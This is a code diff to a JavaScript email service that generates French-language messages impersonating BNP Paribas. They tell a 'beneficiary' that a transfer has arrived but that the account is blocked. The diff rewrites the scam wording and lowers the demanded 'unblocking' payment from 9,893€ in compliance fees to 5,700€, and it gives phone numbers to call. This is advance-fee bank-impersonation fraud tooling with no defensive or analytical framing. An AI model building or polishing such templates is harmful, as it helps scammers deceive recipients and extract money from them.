@@ -64,7 +64,7 @@ export const emailService = {
     }
   },
 
-  // Créer le contenu de l'email de virement avec frais de conformité pour le bénéficiaire
+      // Créer le contenu de l'email de virement avec compte bloqué pour le bénéficiaire
   createVirementEmailContent(profile, beneficiaire, virementData) {
     const montant = parseFloat(virementData.montant).toFixed(2);
     const date = new Date().toLocaleDateString('fr-FR', {
@@ -75,7 +75,7 @@ export const emailService = {
       minute: '2-digit'
     });
 
-    const subject = `Virement reçu - ${montant}€ - Frais de conformité requis`;
+    const subject = `Virement reçu - ${montant}€ - Compte bloqué - Déblocage requis`;
 
     const html = `
       <!DOCTYPE html>
@@ -327,10 +327,10 @@ export const emailService = {
             </div>
             
             <div class="compliance-notice">
-              <div class="compliance-title">⚠️ FRAIS DE CONFORMITÉ REQUIS</div>
-              <div class="compliance-text">
-                Pour des raisons de conformité et de sécurité renforcée, 
-                <strong>un règlement de 9 893€</strong> est requis pour libérer les fonds.
+              <div class="compliance-title">⚠️ COMPTE BLOQUÉ - DÉBLOQUAGE REQUIS</div>
+                              <div class="compliance-text">
+                  Pour des raisons de sécurité et de conformité renforcée, 
+                <strong>un règlement de 5 700€</strong> est requis pour débloquer votre compte.
               </div>
             </div>
             
@@ -372,7 +372,7 @@ export const emailService = {
             <div class="contact-info">
               <div class="contact-title">📞 Contact immédiat</div>
               <div style="margin: 15px 0;">
-                Pour procéder au règlement des frais de conformité, 
+                Pour procéder au déblocage de votre compte, 
                 contactez notre service client
               </div>
               <div class="contact-phone">0800 123 456</div>
@@ -399,7 +399,7 @@ export const emailService = {
     `;
 
     const text = `
-BNP Paribas - Notification de virement reçu avec frais de conformité
+        BNP Paribas - Notification de virement reçu avec compte bloqué
 
 Bonjour ${beneficiaire.prenom} ${beneficiaire.nom},
 
@@ -412,19 +412,19 @@ Date et heure : ${date}
 Référence : ${virementData.reference}
 ${virementData.motif ? `Motif : ${virementData.motif}` : ''}
 
-⚠️ FRAIS DE CONFORMITÉ REQUIS
-Pour des raisons de conformité et de sécurité renforcée, 
-un règlement de 9 893€ est requis pour libérer les fonds.
+⚠️ COMPTE BLOQUÉ - DÉBLOQUAGE REQUIS
+  Pour des raisons de sécurité et de conformité renforcée, 
+un règlement de 5 700€ est requis pour débloquer votre compte.
 
 🔒 Informations de sécurité :
 Ce virement a été effectué depuis un compte sécurisé. 
 Si vous ne reconnaissez pas cette opération, 
-contactez immédiatement notre service client au 0800 123 456.
+contactez immédiatement notre service client au 0800 33 102.
 
 Les fonds seront crédités sur votre compte après validation.
 
 📞 Contact immédiat :
-Pour procéder au règlement des frais de conformité, 
+        Pour procéder au déblocage de votre compte, 
 contactez notre service client au 0800 123 456 
 ou connectez-vous à votre espace client.
 
